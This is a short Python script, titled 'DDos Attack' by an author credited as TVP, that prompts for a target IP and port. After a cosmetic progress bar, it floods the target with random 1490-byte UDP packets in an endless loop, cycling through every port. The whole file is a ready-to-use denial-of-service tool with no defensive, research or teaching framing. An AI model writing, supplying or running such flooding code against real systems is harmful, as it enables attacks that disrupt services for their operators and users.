import sys
import os
import time
import socket
import random
from datetime import datetime


now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system("clear")  
os.system("figlet DDos Attack")
print()
print("Author   : TVP")
print("You Tube : https://www.youtube.com/channel/UCi0umdDaKtK8kvqf2kNnfKQ")
print("github   : https://github.com/tvp9999")
print("Facebook : https://www.facebook.com/hoanganh.mai.9231712")
print()
ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")  
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(3)
print("[=====               ] 25%")
time.sleep(3)
print("[==========          ] 50%")
time.sleep(3)
print("[===============     ] 75%")
time.sleep(3)
print("[====================] 100%")
time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print(f"Sent {sent} packet to {ip} through port:{port}")
    if port == 65534:
        port = 1
